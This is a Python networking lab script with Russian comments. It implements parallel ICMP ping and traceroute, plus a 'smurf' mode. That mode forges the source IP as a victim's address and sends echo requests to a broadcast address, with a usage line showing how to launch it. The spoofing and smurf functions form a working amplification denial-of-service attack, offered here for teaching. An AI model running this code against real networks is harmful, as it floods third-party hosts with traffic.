#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Лабораторная работа №5.
Изучение протоколов ICMP и IP: параллельный ping, traceroute 
и демонстрация Smurf-атаки с подменой IP-адреса источника.

ЗАПУСК: требует прав администратора (raw-сокеты).
    sudo python3 icmp_lab5.py 8.8.8.8 ya.ru 
    sudo python3 icmp_lab5.py --mode traceroute 8.8.8.8
    sudo python3 icmp_lab5.py --mode smurf --target 192.168.1.100 --broadcast 192.168.1.255 --count 10
"""

import argparse
import os
import select
import socket
import struct
import sys
import threading
import time

# Константы протокола ICMP
ICMP_ECHO_REPLY = 0
ICMP_DEST_UNREACHABLE = 3
ICMP_ECHO_REQUEST = 8
ICMP_TIME_EXCEEDED = 11

DEFAULT_TIMEOUT = 2.0
DEFAULT_COUNT = 4
DEFAULT_MAX_TTL = 30
PACKET_SIZE = 1024

print_lock = threading.Lock()
recv_lock = threading.Lock()


def log(text):
    with print_lock:
        print(text, flush=True)


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        total += word
    total = (total >> 16) + (total & 0xFFFF)
    total += (total >> 16)
    return (~total) & 0xFFFF


def build_echo_request(icmp_id: int, seq: int) -> bytes:
    header = struct.pack('!BBHHH', ICMP_ECHO_REQUEST, 0, 0, icmp_id, seq)
    timestamp_bytes = struct.pack('!d', time.time())
    payload = timestamp_bytes + b'LAB5-ICMP-PING-PAYLOAD'
    chksum = checksum(header + payload)
    header = struct.pack('!BBHHH', ICMP_ECHO_REQUEST, 0, chksum, icmp_id, seq)
    return header + payload


def build_ip_header(src_ip: str, dst_ip: str, payload_len: int) -> bytes:
    """
    Формирует пользовательский IP-заголовок для реализации Smurf-атаки (IP_HDRINCL).
    Позволяет подделать поле Source IP (адрес атакуемого узла).
    """
    ihl = 5
    version = 4
    tos = 0
    total_len = 20 + payload_len
    ident = 54321
    flags_frag = 0
    ttl = 64
    proto = socket.IPPROTO_ICMP
    hdr_chksum = 0  # ОС может сама пересчитать или можно оставить 0 при IP_HDRINCL (в Linux)
    
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (version << 4) + ihl,
                            tos,
                            total_len,
                            ident,
                            flags_frag,
                            ttl,
                            proto,
                            hdr_chksum,
                            src,
                            dst)
    return ip_header


def parse_ip_header(data: bytes) -> dict:
    ihl_byte, tos, total_len, ident, flags_frag, ttl, proto, hdr_chksum, src, dst = \
        struct.unpack('!BBHHHBBH4s4s', data[:20])
    ihl = (ihl_byte & 0x0F) * 4
    return {
        'ihl': ihl,
        'ttl': ttl,
        'proto': proto,
        'src': socket.inet_ntoa(src),
        'dst': socket.inet_ntoa(dst),
    }


def parse_icmp_header(data: bytes) -> dict:
    icmp_type, code, chksum, p_id, seq = struct.unpack('!BBHHH', data[:8])
    return {
        'type': icmp_type,
        'code': code,
        'id': p_id,
        'seq': seq,
        'payload': data[8:],
    }


def extract_embedded_probe(icmp_payload: bytes):
    if len(icmp_payload) < 20 + 8:
        return None
    inner_ip = parse_ip_header(icmp_payload[:20])
    inner_ihl = inner_ip['ihl']
    inner_icmp_raw = icmp_payload[inner_ihl:inner_ihl + 8]
    if len(inner_icmp_raw) < 8:
        return None
    _type, _code, _chk, orig_id, orig_seq = struct.unpack('!BBHHH', inner_icmp_raw)
    return orig_id, orig_seq, inner_ip['dst']


def receive_matching(sock: socket.socket, my_id: int, timeout: float):
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return None

        with recv_lock:
            ready, _, _ = select.select([sock], [], [], min(remaining, 0.2))
            if not ready:
                continue

            try:
                raw, addr = sock.recvfrom(PACKET_SIZE, socket.MSG_PEEK)
            except OSError:
                continue

            ip_info = parse_ip_header(raw)
            icmp_info = parse_icmp_header(raw[ip_info['ihl']:])

            belongs_to_me = False
            if icmp_info['type'] == ICMP_ECHO_REPLY:
                belongs_to_me = (icmp_info['id'] == my_id)
            elif icmp_info['type'] in (ICMP_TIME_EXCEEDED, ICMP_DEST_UNREACHABLE):
                embedded = extract_embedded_probe(icmp_info['payload'])
                if embedded is not None:
                    orig_id, _orig_seq, _orig_dst = embedded
                    belongs_to_me = (orig_id == my_id)

            if not belongs_to_me:
                continue

            try:
                raw, addr = sock.recvfrom(PACKET_SIZE)
            except OSError:
                continue
            ip_info = parse_ip_header(raw)
            icmp_info = parse_icmp_header(raw[ip_info['ihl']:])
            return ip_info, icmp_info


def handle_echo_reply(host, ip_info, icmp_info, sent_at):
    payload = icmp_info['payload']
    rtt_ms = None
    if len(payload) >= 8:
        (sent_ts,) = struct.unpack('!d', payload[:8])
        rtt_ms = (time.time() - sent_ts) * 1000.0
    elif sent_at is not None:
        rtt_ms = (time.time() - sent_at) * 1000.0
    log(f"[{host}] Ответ от {ip_info['src']}: seq={icmp_info['seq']} "
        f"ttl={ip_info['ttl']} время={rtt_ms:.2f} мс" if rtt_ms is not None
        else f"[{host}] Ответ от {ip_info['src']}: seq={icmp_info['seq']}")
    return rtt_ms


def handle_time_exceeded(host, ip_info, icmp_info, sent_at, ttl):
    rtt_ms = (time.time() - sent_at) * 1000.0 if sent_at is not None else None
    log(f"[{host}] TTL={ttl:2d}  {ip_info['src']:<15}  "
        f"{(f'{rtt_ms:6.2f} мс' if rtt_ms else '')}  (время жизни пакета истекло)")
    return rtt_ms


def handle_dest_unreachable(host, ip_info, icmp_info, ttl=None):
    code = icmp_info['code']
    reasons = {
        0: "сеть недостижима",
        1: "хост недостижим",
        2: "протокол недоступен",
        3: "порт недоступен",
        4: "требуется фрагментация, но установлен запрет (DF)",
        13: "запрещено фильтром",
    }
    reason = reasons.get(code, f"код={code}")
    prefix = f"TTL={ttl:2d}  " if ttl is not None else ""
    log(f"[{host}] {prefix}{ip_info['src']:<15}  недостижим: {reason}")


def ping_worker(host, send_sock, recv_sock, count, timeout, results):
    try:
        dest_ip = socket.gethostbyname(host)
    except socket.gaierror:
        log(f"[{host}] Не удалось разрешить имя хоста")
        return

    icmp_id = (os.getpid() ^ threading.get_ident()) & 0xFFFF
    sent_times = {}
    rtts = []
    lost = 0

    log(f"--- PING {host} ({dest_ip}) ---")
    for seq in range(1, count + 1):
        packet = build_echo_request(icmp_id, seq)
        sent_at = time.time()
        sent_times[seq] = sent_at
        try:
            send_sock.sendto(packet, (dest_ip, 0))
        except OSError as e:
            log(f"[{host}] Ошибка отправки: {e}")
            continue

        response = receive_matching(recv_sock, icmp_id, timeout)
        if response is None:
            log(f"[{host}] Превышено время ожидания ответа для seq={seq}")
            lost += 1
            continue

        ip_info, icmp_info = response
        if icmp_info['type'] == ICMP_ECHO_REPLY:
            rtt = handle_echo_reply(host, ip_info, icmp_info, sent_times.get(seq))
            if rtt is not None:
                rtts.append(rtt)
        elif icmp_info['type'] == ICMP_TIME_EXCEEDED:
            handle_time_exceeded(host, ip_info, icmp_info, sent_times.get(seq), ttl=64)
            lost += 1
        elif icmp_info['type'] == ICMP_DEST_UNREACHABLE:
            handle_dest_unreachable(host, ip_info, icmp_info)
            lost += 1
        time.sleep(0.2)

    loss_pct = (lost / count) * 100 if count else 0
    summary = f"--- статистика {host} ({dest_ip}) ---\n" \
              f"передано={count}, получено={count - lost}, потери={loss_pct:.0f}%"
    if rtts:
        summary += f", rtt min/avg/max = {min(rtts):.2f}/{sum(rtts)/len(rtts):.2f}/{max(rtts):.2f} мс"
    log(summary)
    results[host] = {'sent': count, 'lost': lost, 'rtts': rtts}


def traceroute_worker(host, send_sock, recv_sock, max_ttl, timeout, results):
    try:
        dest_ip = socket.gethostbyname(host)
    except socket.gaierror:
        log(f"[{host}] Не удалось разрешить имя хоста")
        return

    icmp_id = (os.getpid() ^ threading.get_ident() ^ 0x5A5A) & 0xFFFF
    log(f"--- TRACEROUTE до {host} ({dest_ip}), максимум {max_ttl} хопов ---")

    path = []
    for ttl in range(1, max_ttl + 1):
        seq = ttl
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
        packet = build_echo_request(icmp_id, seq)
        sent_at = time.time()
        try:
            send_sock.sendto(packet, (dest_ip, 0))
        except OSError as e:
            log(f"[{host}] Ошибка отправки TTL={ttl}: {e}")
            continue

        response = receive_matching(recv_sock, icmp_id, timeout)
        if response is None:
            log(f"[{host}] TTL={ttl:2d}  *  (нет ответа)")
            path.append(None)
            continue

        ip_info, icmp_info = response
        if icmp_info['type'] == ICMP_TIME_EXCEEDED:
            handle_time_exceeded(host, ip_info, icmp_info, sent_at, ttl)
            path.append(ip_info['src'])
            continue
        elif icmp_info['type'] == ICMP_ECHO_REPLY:
            rtt = (time.time() - sent_at) * 1000.0
            log(f"[{host}] TTL={ttl:2d}  {ip_info['src']:<15}  {rtt:6.2f} мс  (цель достигнута)")
            path.append(ip_info['src'])
            break
        elif icmp_info['type'] == ICMP_DEST_UNREACHABLE:
            handle_dest_unreachable(host, ip_info, icmp_info, ttl)
            path.append(ip_info['src'])
            break

    results[host] = {'path': path}


def smurf_attack(target_ip: str, broadcast_ip: str, count: int):
    """
    Реализация Smurf-атаки:
    Отправка ICMP Echo Request на широковещательный адрес сети (broadcast_ip)
    с подменой IP-адреса источника на адрес жертвы (target_ip).
    """
    log(f"=== ЗАПУСК SMURF-АТАКИ ===")
    log(f"Цель (жертва, чей IP подделывается): {target_ip}")
    log(f"Широковещательный адрес сети (усилитель): {broadcast_ip}")

    # Создаем сокет с поддержкой пользовательского IP-заголовка (IP_HDRINCL)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except PermissionError:
        log("Ошибка: Для отправки пакетов с поддельным IP требуются права root (sudo).")
        return

    icmp_id = 0x1337
    for seq in range(1, count + 1):
        icmp_packet = build_echo_request(icmp_id, seq)
        ip_header = build_ip_header(src_ip=target_ip, dst_ip=broadcast_ip, payload_len=len(icmp_packet))
        
        full_packet = ip_header + icmp_packet
        
        try:
            sock.sendto(full_packet, (broadcast_ip, 0))
            log(f"[SMURF] Отправлен пакет #{seq} на бродкаст {broadcast_ip} от имени {target_ip}")
        except OSError as e:
            log(f"[SMURF] Ошибка отправки пакета: {e}")
        
        time.sleep(1.0)

    sock.close()
    log("=== SMURF-АТАКА ЗАВЕРШЕНА ===")
    log("Проверьте Wireshark на узле-цели: вы должны увидеть лавинообразные входящие ICMP Echo Reply от узлов сети.")


def make_raw_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.settimeout(0.5)
    return sock


def main():
    parser = argparse.ArgumentParser(
        description="Параллельный ping/traceroute и Smurf-атака (Лаб. работа №5)")
    parser.add_argument('hosts', nargs='*', help='список хостов для ping/traceroute')
    parser.add_argument('--mode', choices=['ping', 'traceroute', 'both', 'smurf'],
                         default='ping', help='режим работы')
    parser.add_argument('--count', type=int, default=DEFAULT_COUNT,
                         help='число запросов')
    parser.add_argument('--timeout', type=float, default=DEFAULT_TIMEOUT,
                         help='таймаут ожидания')
    parser.add_argument('--max-ttl', type=int, default=DEFAULT_MAX_TTL,
                         help='максимальный TTL')
    # Аргументы для Smurf-атаки
    parser.add_argument('--target', type=str, help='IP-адрес жертвы для Smurf-атаки')
    parser.add_argument('--broadcast', type=str, help='Широковещательный IP-адрес сети для Smurf-атаки')
    
    args = parser.parse_args()

    if os.name != 'nt' and os.geteuid() != 0:
        log("ВНИМАНИЕ: для работы с raw-сокетами нужны права root (запустите через sudo).")

    if args.mode == 'smurf':
        if not args.target or not args.broadcast:
            log("Ошибка: для режима smurf необходимо указать --target и --broadcast")
            sys.exit(1)
        smurf_attack(args.target, args.broadcast, args.count)
        return

    if not args.hosts:
        parser.print_help()
        sys.exit(1)

    shared_recv_sock = make_raw_socket()
    threads = []
    results = {}

    for host in args.hosts:
        if args.mode in ('ping', 'both'):
            send_sock = make_raw_socket()
            t = threading.Thread(
                target=ping_worker,
                args=(host, send_sock, shared_recv_sock, args.count, args.timeout, results),
                name=f"ping-{host}",
                daemon=True,
            )
            threads.append(t)

        if args.mode in ('traceroute', 'both'):
            send_sock2 = make_raw_socket()
            t2 = threading.Thread(
                target=traceroute_worker,
                args=(host, send_sock2, shared_recv_sock, args.max_ttl, args.timeout, results),
                name=f"trace-{host}",
                daemon=True,
            )
            threads.append(t2)

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    log("\nВсе потоки завершены.")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
